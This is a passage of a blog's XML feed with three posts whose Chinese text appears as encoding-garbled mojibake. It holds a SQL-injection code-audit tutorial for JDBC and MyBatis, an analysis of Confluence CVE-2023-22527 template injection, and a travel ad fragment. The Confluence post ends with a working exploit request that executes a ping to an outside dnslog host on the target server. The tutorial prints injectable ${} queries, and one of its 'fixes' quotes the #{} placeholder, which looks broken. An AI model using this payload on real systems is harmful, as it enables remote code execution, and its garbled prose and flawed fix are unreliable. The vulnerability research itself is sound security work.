class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//ä¿®å¤åçš„ä»£ç ç‰‡æ®µ</span><br><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><span class="hljs-keyword">try</span> &#123;<br>    Class.forName(driver);<br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(url, user, password);<br><br>    <span class="hljs-keyword">if</span> (!con.isClosed())<br>        System.out.println(<span class="hljs-string">&quot;Connecting to Database successfully.&quot;</span>);<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = ?&quot;</span>;<br>    <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql);<br>    st.setString(<span class="hljs-number">1</span>, username);<br><br>    logger.info(st.toString());<br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> st.executeQuery();<br><br>    <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">res_name</span> <span class="hljs-operator">=</span> rs.getString(<span class="hljs-string">&quot;username&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">res_pwd</span> <span class="hljs-operator">=</span> rs.getString(<span class="hljs-string">&quot;password&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);<br>        result.append(info);<br>        logger.info(info);<br>    &#125;<br><br>    rs.close();<br>    con.close();<br><br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>    logger.error(<span class="hljs-string">&quot;Sorry, can&#x27;t find the Driver!&quot;</span>);<br>    e.printStackTrace();<br>&#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>    logger.error(e.toString());<br>&#125;<br><span class="hljs-keyword">return</span> result.toString();<br></code></pre></td></tr></table></figure><p>ä¿®å¤ä¹‹åé¦–å…ˆä½¿ç”¨ï¼Ÿè¿›è¡Œå ä½ï¼Œç„¶åæ‰§è¡ŒSQLï¼Œå†å°†usernameè¿›è¡Œç»‘å®šã€‚è¿™æ ·å°±ä¼šè§£å†³SQLæ³¨å…¥çš„é—®é¢˜ã€‚</p><p><strong>tipsï¼š</strong></p><p>é¢„ç¼–è¯‘ä½¿ç”¨æœ‰è¯¯ï¼Œæ²¡æœ‰è°ƒç”¨ set æ–¹æ³•å°†å˜é‡ä¸å ä½ç¬¦è¿›è¡Œå¯¹åº”ã€‚ä¹Ÿä¼šå­˜åœ¨SQLæ³¨å…¥æ¼æ´<br>ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from test where id = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstt</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br><span class="hljs-comment">// pstt.setObject(1,id);</span><br></code></pre></td></tr></table></figure><h1 id="å…¶ä»–æ¥å£åˆ†æ"><a href="#å…¶ä»–æ¥å£åˆ†æ" class="headerlink" title="å…¶ä»–æ¥å£åˆ†æ"></a>å…¶ä»–æ¥å£åˆ†æ</h1><h3 id="æºç å±•ç¤º-1"><a href="#æºç å±•ç¤º-1" class="headerlink" title="æºç å±•ç¤º"></a>æºç å±•ç¤º</h3><p>æˆ‘ä»¬é€šè¿‡JDBCåœ¨ç†Ÿæ‚‰SQLå®¡è®¡çš„ç®€å•æµç¨‹ä¹‹åï¼Œæˆ‘ä»¬çœ‹ä¸‹æ¥åˆ†æä¸€ä¸‹å¦ä¸€ç§Mybatisçš„æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">GET  /sqli/mybatis/vuln01      query=username<br></code></pre></td></tr></table></figure><p>æ­¤æ­¥çœç•¥ä¹‹å‰çš„è·¯ç”±å¯»æ‰¾ï¼Œç›´æ¥æŸ¥çœ‹æºç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//SQLI.java</span><br>    <span class="hljs-meta">@GetMapping(&quot;/mybatis/vuln01&quot;)</span><br><span class="hljs-comment">//æ¥æ”¶å‚æ•°username</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>        <span class="hljs-comment">//è°ƒç”¨userMapperæŸ¥è¯¢username</span><br>        <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln01(username);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//UserMapper.java</span><br><span class="hljs-comment">//æŸ¥è¯¢ä¼ å…¥å‚æ•°çš„sql</span><br>    <span class="hljs-meta">@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span><br><span class="hljs-comment">//å°†usernameä¸sqlè¯­å¥ä¸­çš„usernameè¿›è¡Œå…³è”ï¼Œè¿”å›ä¸€ä¸ªç»“æœlist</span><br>    List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln01</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br></code></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-1"><a href="#æºç åˆ†æ-1" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>ä¸Šè¿°ä»£ç ä½¿ç”¨äº† MyBatis æ¡†æ¶è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢æ“ä½œã€‚ç„¶è€Œåœ¨å…¶SQLè¯­å¥ä¸­ä½¿ç”¨äº†${}è¿›è¡Œå˜é‡æ›¿æ¢ã€‚</p><p>åœ¨Mybatisä¸­ï¼Œ#{}æ˜¯é¢„ç¼–è¯‘å¤„ç†ï¼Œ${}æ˜¯å­—ç¬¦ä¸²æ›¿æ¢ï¼Œä½¿ç”¨${}å°±å¯èƒ½å¯¼è‡´SQLæ³¨å…¥ã€‚<br>ç¤ºä¾‹ï¼š<code>Select * from news where title like &#39;%#&#123;title&#125;%&#39;</code></p><h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p><img src="https://i.miji.bid/2024/02/01/8ab4425a9e7ce0c48241c2be4068781d.png" alt="image-20240201164839073"></p><h3 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//ä¿®å¤åçš„ä»£ç ç‰‡æ®µ</span><br><span class="hljs-comment">//UserMapper.java</span><br>    <span class="hljs-meta">@Select(&quot;select * from users where username = &#x27;#&#123;username&#125;&#x27;&quot;)</span><br>    List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln01</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br></code></pre></td></tr></table></figure><p>ä¿®å¤ä¹‹åä½¿ç”¨#{}è¿›è¡Œé¢„ç¼–è¯‘æ“ä½œï¼Œæ­¤æ—¶å°±ä¸ä¼šäº§ç”ŸSQLæ³¨å…¥çš„é—®é¢˜ã€‚</p><p><strong>tips:</strong></p><p>mybatisæœ‰ä¸¤ç§å†™æ³•ï¼Œä¸€ç§æ˜¯åŸºäºæ³¨è§£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CategoryMapper</span> &#123;<br>    <span class="hljs-meta">@Select(&quot;select * from category_ where name= &#x27;$&#123;name&#125;&#x27; &quot;)</span><br>    <span class="hljs-keyword">public</span> CategoryM <span class="hljs-title function_">getByName</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;name&quot;)</span> String name)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦ä¸€ç§æ˜¯åŸºäºxmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;cn.seaii.springboot.mapper.CategoryMapper&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;get&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;cn.seaii.springboot.pojo.CategoryM&quot;</span>&gt;</span><br>        select * from category_ where id= $&#123;id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„åœ¨mavené¡¹ç›®ä¸­ï¼Œxmlæ–‡ä»¶è¦æ”¾åœ¨resourcesç›®å½•ä¸­ã€‚æ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><h1 id="ç»“å°¾ï¼š"><a href="#ç»“å°¾ï¼š" class="headerlink" title="ç»“å°¾ï¼š"></a>ç»“å°¾ï¼š</h1><p>æ€»çš„æ¥è¯´ï¼Œè¿™ä¸ªåªæ˜¯å…¥é—¨ï¼Œåœ¨çœŸå®æƒ…å†µä¸‹ï¼Œç›¸å¯¹æ¥è¯´ä¼šæ¯”è¾ƒå¤æ‚ã€‚è¿˜éœ€è¦å¤šå…³æ³¨filterä¸­çš„æµç¨‹å’Œç»•æ¥ç»•å»æˆ–è€…å¥—çš„å¾ˆæ·±çš„æºç ã€‚å…·ä½“è¿˜æ˜¯å¾—å¤šçœ‹å¤šå®è·µã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&mid=2727827368&idx=1&sn=765d0835f0069b5145523c31e8229850&mpshare=1&scene=1&srcid=0926a6QC3pGbQ3Pznszb4n2q">Mybatisæ¡†æ¶ä¸‹SQLæ³¨å…¥æ¼æ´é¢é¢è§‚</a></p>]]></content>
    
    
    <categories>
      
      <category>ä»£ç å®¡è®¡</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æµ…æConfluence_CVE-2023-22527</title>
    <link href="/2024/01/24/%E6%B5%85%E6%9E%90Confluence-CVE-2023-22527/"/>
    <url>/2024/01/24/%E6%B5%85%E6%9E%90Confluence-CVE-2023-22527/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><h2 id="ç¢ç¢å¿µ"><a href="#ç¢ç¢å¿µ" class="headerlink" title="ç¢ç¢å¿µ"></a>ç¢ç¢å¿µ</h2><p>çºµä½¿æœ‰å‰è¨€ä¸‡è¯­ï¼Œæ‰“å¼€ç¼–è¾‘å™¨ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆå¼€å¤´ï¼Œä¹Ÿä¸çŸ¥é“å¦‚ä½•ä¸‹ç¬”ï¼Œæ•²äº†åˆ ï¼Œåˆ äº†æ•²ï¼Œçº ç»“ï¼Œå½·å¾¨ï¼Œè¿˜æ˜¯éšä¾¿å†™å†™ï¼Œåæ­£ä¹Ÿæ²¡äººçœ‹ï¼Œå½“ä½œä¸€æ®µæ—¶é—´çš„ç¢ç¢å¿µå§ã€‚</p><p>æœ€è¿‘ä¸€æ®µæ—¶é—´å®¶é‡Œå‘ç”Ÿäº†ä¸€äº›äº‹ï¼ŒåŒ…æ‹¬æˆ‘ä»Šå¹´ä¹Ÿé¢ä¸´æ¯•ä¸šï¼Œå¯æ˜¯æˆ‘é‚£ä¸‰æµçš„æœ«æµå­¦æ ¡åœ¨æ ¡æ‹›å½“ä¸­çŠ¹å¦‚æœ‰æ¡ˆåº•ä¸€èˆ¬ä¸è¢«å¾…è§ã€‚æ‰€ä»¥ä¸ç®¡æ˜¯å·¥ä½œä¹Ÿå¥½ç”Ÿæ´»ä¹Ÿç½¢ï¼Œæœ€è¿‘çŠ¶æ€ä¸€ç›´ä¸åœ¨çº¿ã€‚æˆ‘æƒ³è·³å‡ºè¿™æ ·ä¸€ä¸ªä¸è‰¯çš„çŠ¶æ€ã€‚å¹´å…³å°†è‡³ï¼Œè¶ç€è¿™æ®µæ—¶é—´å¥½å¥½ç»™è‡ªå·±æ”¾ä¸ªå‡ï¼Œè°ƒæ•´ä¸€ä¸‹è‡ªå·±ï¼Œæ–°çš„ä¸€å¹´è‡ªå·±ä¹Ÿè¦æœ‰äº›æˆé•¿ã€‚</p><p>å…³äºå®¶é‡Œï¼šæˆ‘æƒ³åœ¨çˆ·çˆ·å‰©ä¸‹çš„æ—¶é—´é‡Œï¼Œå°½å¯èƒ½çš„å¤šé™ªé™ªä»–è€äººå®¶ï¼Œä»å°åœ¨çˆ·çˆ·å¥¶å¥¶é™ªä¼´ä¸‹æˆé•¿ï¼Œæˆ‘ä¹Ÿå¹¶ä¸æ˜¯æ”¾è¡ä¸ç¾ï¼Œåä¹‹æˆ‘è§‰å¾—è‡ªå·±ç®—å¾—ä¸Šæ˜¯ä¸ªæ‡‚äº‹çš„å­©å­ã€‚</p><p>å…³äºå·¥ä½œï¼šå­¦æ ¡è™½åœ¨æœ«æµï¼Œå¯æ˜¯æˆ‘ä¹Ÿæœ‰ä¸€é¢—ç§¯æå‘ä¸Šçš„å¿ƒã€‚æˆ‘è§‰å¾—èƒ½é™åˆ¶æˆ‘è‡ªå·±çš„åªæœ‰æˆ‘è‡ªå·±ã€‚æˆ‘ä¹Ÿæƒ³å½“ä¸€ä¸ªå¤§å‚çš„ç¤¾ç•œï¼Œå¯æ˜¯è¿æœºä¼šéƒ½æ²¡æœ‰ã€‚ç›®å‰åªèƒ½æ˜¯èµ°ä¸€æ­¥çœ‹ä¸€æ­¥ï¼Œä»Šå¹´çš„å°±ä¸šå½¢åŠ¿å¤ªç³Ÿç³•äº†ã€‚å¤§å‚å„ç§è£å‘˜ï¼Œå°å‚åšæŒä¸ä½ä¹Ÿæœ‰å€’äº†çš„ã€‚æ€»ä¹‹æ€¨å¤©å°¤äººæ²¡æœ‰ç”¨ï¼Œåˆ«äººéƒ½å¯ä»¥ä¸ºä»€ä¹ˆä½ ä¸å¯ä»¥ï¼ŸåŠªåŠ›å§</p><p>å…³äºå­¦ä¹ ï¼šå·¥ä½œä¹‹åæ‰çŸ¥é“ï¼Œå­¦äº†é‚£ä¹ˆå¤šä¸œè¥¿çœŸç”¨çš„æ—¶å€™ä¸ä¸€å®šç”¨å¾—ä¸Šï¼Œä½†æ˜¯ä¸€å®šå¾—çŸ¥é“ã€‚å› ä¸ºç›®å‰ä¸€ç›´åœ¨å®ä¹ ï¼Œå­¦ä¹ çš„é‡å¿ƒä¹Ÿåå‘å®‰å…¨ç ”ç©¶ï¼Œç§‹æ‹›è¿‡åï¼Œæˆ‘æ‰çŸ¥é“è‡ªå·±ä¸å±äºè¿™ä¸ªæ–¹å‘ã€‚åé¢è¿˜å¾—åŠ å¼ºå¹¿åº¦å­¦ä¹ ã€‚ç­‰åˆ°çœŸæ‰¾åˆ°æ­£å¼å·¥ä½œä¹‹åï¼Œå†å…·ä½“å®šå­¦ä¹ é‡å¿ƒå§ã€‚</p><h2 id="æ¼æ´ç®€è¿°"><a href="#æ¼æ´ç®€è¿°" class="headerlink" title="æ¼æ´ç®€è¿°"></a>æ¼æ´ç®€è¿°</h2><p>æœ¬æ¬¡Confluenceçš„æ´å®é™…ä¸Šæ˜¯<strong>SSTLï¼ˆæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼‰</strong>ã€‚å› ä¸ºä¹‹å‰æ²¡æœ‰äº†è§£è¿‡è¿™ç±»çš„æ¼æ´ï¼Œæ‰€ä»¥åœ¨åˆ†æä¹‹å‰è¿˜çœ‹äº†å‡ ç¯‡ç›¸å…³çš„æ–‡ç« ï¼Œé“¾æ¥æ”¾åœ¨ä¸‹é¢ï¼Œä»…ä¾›å‚è€ƒã€‚</p><p><a href="https://hackerqwq.github.io/2021/12/14/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-SSTI%E6%BC%8F%E6%B4%9E/">SSTLåŸºç¡€å­¦ä¹ </a></p><p><a href="https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context">POCæ„é€ </a></p><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><p>Confluenceä½¿ç”¨çš„æ˜¯Velocityæ¨¡æ¿ï¼Œå…·ä½“çš„ç»†èŠ‚åœ¨ä¸Šé¢SSTLåŸºç¡€ä¸­æœ‰æ¶‰åŠåˆ°ã€‚å®ƒæ˜¯ä»¥.vmç»“å°¾çš„æ–‡ä»¶ã€‚è€Œåœ¨Confluenceä¸­å¤„ç†.vmçš„ç±»æ˜¯<code>ConfluenceVelocityServlet</code>ã€‚å®ƒä¸»è¦è´Ÿè´£å¤„ç†è¯·æ±‚å’Œè§£æ.vmæ¨¡æ¿ï¼Œå¤„ç†åå°†ç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚</p><p><img src="https://i.miji.bid/2024/01/24/4ad2b6b190fe5e642d5bfea13a82f82d.png" alt="image-20240124162620127"></p><p>è¿›å…¥åˆ°<code>doPost</code>ä¹‹åä¼šè°ƒç”¨<code>doRequest</code>ï¼Œå…¶ä¸­æˆ‘ä»¬åªéœ€è¦å…³æ³¨ä¸¤ä¸ªæ ‡çº¢çš„åœ°æ–¹ã€‚</p><p>é¦–å…ˆæ˜¯ç¬¬ä¸€å¤„ï¼Œå®ƒé€šè¿‡è·å–è¯·æ±‚è·¯å¾„ä¹‹åï¼Œè¿”å›ä¸€ä¸ªtemplateå¯¹è±¡ã€‚</p><p><img src="https://i.miji.bid/2024/01/24/1c72af5b21abd53c94ed351ddbbba5ec.png" alt="image-20240124163235115"></p><p>ç¬¬äºŒå¤„ï¼Œæˆ‘ä»¬è·Ÿè¿›</p><p><img src="https://i.miji.bid/2024/01/24/0b5abcf3d4f0bc5d01eb4d4311f81e78.md.png" alt="image-20240124164404454"></p><p>å‰é¢éƒ½æ˜¯è·å–ä¸€äº›åŸºç¡€çš„å¯¹è±¡ï¼Œåœ¨tryå½“ä¸­è·å–äº†PageContextçš„è¾“å‡ºæµï¼Œå°†æ¨¡æ¿å’Œcontextè¿›è¡Œåˆå¹¶å°†ç»“æœä¿å­˜åˆ°è¾“å‡ºæµä¹‹ä¸­ã€‚æˆ‘ä»¬è·Ÿè¿›çœ‹ä¸‹å…·ä½“å®ç°é€»è¾‘ã€‚</p><p><img src="https://i.miji.bid/2024/01/24/2847d8df9262a662766f3f9002f94a94.md.png" alt="image-20240124164940588"></p><p>å‘ç°åœ¨å…¶å†…éƒ¨çš„é‡è½½å‡½æ•°ä¸­è·å–äº†ä¼ å…¥çš„macroLibrariesä¸ºç©ºï¼Œæ‰€ä»¥ç›´æ¥ä¼šè·³åˆ°tryçš„é€»è¾‘ä¸­ã€‚</p><ol><li>è°ƒç”¨ <code>ica.pushCurrentTemplateName(this.name);</code> å°†å½“å‰æ¨¡æ¿çš„åç§°å‹å…¥åˆ° <code>ica</code> çš„æ¨¡æ¿åå †æ ˆä¸­ã€‚è¿™æ˜¯ä¸ºäº†åœ¨åµŒå¥—æ¨¡æ¿çš„æƒ…å†µä¸‹èƒ½å¤Ÿè¿½è¸ªåˆ°å½“å‰æ­£åœ¨å¤„ç†çš„æ¨¡æ¿åç§°ã€‚</li><li>è°ƒç”¨ <code>ica.setCurrentResource(this);</code> å°†å½“å‰æ¨¡æ¿å¯¹è±¡è®¾ç½®ä¸º <code>ica</code> çš„å½“å‰èµ„æºã€‚è¿™æ˜¯ä¸ºäº†è®© <code>ica</code> çŸ¥é“å½“å‰æ­£åœ¨å¤„ç†çš„æ¨¡æ¿èµ„æºã€‚</li><li>æœ€åï¼Œé€šè¿‡è°ƒç”¨ <code>((SimpleNode)this.data).render(ica, writer);</code> è¿›è¡Œæ¨¡æ¿æ¸²æŸ“</li></ol><p>è·Ÿè¿›æœ€åæ¸²æŸ“çš„å †æ ˆä¿¡æ¯å¦‚ä¸‹ï¼š</p><p><img src="https://i.miji.bid/2024/01/24/879d4d6f0fff9af2dbf7da5b70a73e4e.png" alt="image-20240124170150732"></p><p>ç„¶åä¸€ç›´åˆ°<code>ASTReference#execute</code>ä¸­</p><p><img src="https://i.miji.bid/2024/01/24/8e060e406161f880578a609e28def180.md.png" alt="image-20240124170503744"></p><p>é€šè¿‡<code>getVariableValue</code>è·å–<code>context</code>ä¸­çš„<code>this.rootString</code>çš„å˜é‡ã€‚ç„¶åè°ƒç”¨<code>this.jjtGetChild(i).execute</code>æˆ‘ä»¬å†æ¬¡è·Ÿè¿›æŸ¥çœ‹é€»è¾‘</p><p><img src="https://i.miji.bid/2024/01/24/08a0c142000c12812f60473276d3e051.png" alt="image-20240124171329699"></p><p>ä»contextä¸­è·å–åˆ°å‚æ•°åï¼Œç»è¿‡å‡ å±‚è°ƒç”¨åä¼šæ¥åˆ°<code>OgnIValueStack#findValue</code>å…¶ä¸­å †æ ˆä¿¡æ¯å¦‚ä¸‹ï¼š</p><p><img src="https://i.miji.bid/2024/01/24/02a99371cae141ee07ccac99b6eb67fa.png" alt="image-20240124171940953"></p><p>å†…éƒ¨å®ç°ï¼š</p><p><img src="https://i.miji.bid/2024/01/24/65e652509c3e9eedd2694408277ea22d.md.png" alt="image-20240124172123270"></p><p>æœ€åä¼šå†æ¬¡è°ƒç”¨ä¸€è¾¹ä¸Šè¿°æµç¨‹æœ€ç»ˆä¼šæ¥åˆ° <code>UberspectImpl#invoke</code>å…¶ä¸­å †æ ˆä¿¡æ¯å¦‚ä¸‹ï¼š</p><p><img src="https://i.miji.bid/2024/01/24/07bedd8337b0f6cf357602683da8b9d9.png" alt="image-20240124172708293"></p><p>æœ€ç»ˆç»è¿‡ä¸€ç³»åˆ—çš„Invokeè°ƒç”¨æ¥åˆ°<code>UberSpectImpl#invoke</code>çš„doInvokeä¸­å®ç°å°†labelå‚æ•°çš„OGNLè¡¨è¾¾å¼ä¼ å…¥æ‰§è¡Œã€‚</p><p><img src="https://i.miji.bid/2024/01/24/683a34b964141b6bfe704b7ea6d6a98c.md.png" alt="image-20240124173311799"></p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p><img src="https://i.miji.bid/2024/01/24/6613847b1cda2d72cf406fc97d8fbfd5.png" alt="image-20240124173457517"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/template/aui/text-inline.vm</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8090<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>315<br><br><span class="language-reasonml">label=aaa\u0027%<span class="hljs-number">2</span>b#request.get(\u0027.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">KEY_velocity</span>.</span></span>struts2.context\u0027).internal<span class="hljs-constructor">Get(\<span class="hljs-params">u0027ognl</span>\<span class="hljs-params">u0027</span>)</span>.find<span class="hljs-constructor">Value(#<span class="hljs-params">parameters</span>.<span class="hljs-params">poc</span>[0],&#123;&#125;)</span>%<span class="hljs-number">2</span>b\u0027&amp;poc=@org.apache. struts2.ServletActionContext@get<span class="hljs-constructor">Response()</span>.set<span class="hljs-constructor">Header(&#x27;Cmd-Responses-Header&#x27;,(<span class="hljs-params">new</span> <span class="hljs-params">freemarker</span>.<span class="hljs-params">template</span>.<span class="hljs-params">utility</span>.Execute()</span>).exec(&#123;<span class="hljs-string">&quot;ping pog9c1.dnslog.cn&quot;</span>&#125;))</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´åˆ†æ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¹³é™†å¤©é¹…æ¹–-LXG</title>
    <link href="/2023/12/28/%E5%B9%B3%E9%99%86%E5%A4%A9%E9%B9%85%E6%B9%96-LXG/"/>
    <url>/2023/12/28/%E5%B9%B3%E9%99%86%E5%A4%A9%E9%B9%85%E6%B9%96-LXG/</url>
    
    <content type="html"><![CDATA[<h1 id="å±±è¥¿å¹³é™†å¤©é¹…æ¹–-æ¢ç§˜é™•å·åœ°å‘é™¢-1æ—¥æ¸¸"><a href="#å±±è¥¿å¹³é™†å¤©é¹…æ¹–-æ¢ç§˜é™•å·åœ°å‘é™¢-1æ—¥æ¸¸" class="headerlink" title="å±±è¥¿å¹³é™†å¤©é¹…æ¹– æ¢ç§˜é™•å·åœ°å‘é™¢ 1æ—¥æ¸¸"></a>å±±è¥¿å¹³é™†å¤©é¹…æ¹– æ¢ç§˜é™•å·åœ°å‘é™¢ 1æ—¥æ¸¸</h1><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">äº§å“ä»·æ ¼ï¼šï¿¥<span class="hljs-number">108</span>èµ·<br><br>ç§¯åˆ†ä¿ƒé”€ï¼š      <span class="hljs-number">100</span><span class="hljs-comment">%</span><br><br>æ´»åŠ¨ç‰¹è‰²ï¼š          å¤©é¹…æ¹–æ‹å¤©é¹… 